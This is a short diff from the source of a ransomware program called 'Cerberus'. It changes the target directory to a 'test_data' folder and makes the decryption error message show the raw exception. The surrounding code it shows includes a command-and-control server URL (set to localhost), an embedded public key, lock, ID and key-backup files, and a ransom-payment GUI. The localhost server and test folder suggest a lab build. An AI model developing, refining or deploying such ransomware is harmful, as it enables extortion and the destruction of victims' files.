@@ -98,7 +98,7 @@ FQIDAQAB
 -----END PUBLIC KEY-----"""
 
 C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
-TARGET_DIRECTORY = os.path.join(os.path.expanduser("."), "test_data")
+TARGET_DIRECTORY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test_data")
 LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
 ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
 KEY_BACKUP_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_key.bak") # SAFETY: Backup key before check-in
@@ -482,7 +482,7 @@ class RansomwareGUI:
                 self.master.after(0, self.finish_decryption, decrypted_files)
             except Exception as e:
                 log_error(f"Decryption failed: {e}")
-                self.master.after(0, lambda: self.payment_status.config(text="ERROR: Decryption failed.", fg='red'))
+                self.master.after(0, lambda: self.payment_status.config(text=f"ERROR: {str(e)}", fg='red'))
 
         threading.Thread(target=decrypt_process, daemon=True).start()
 
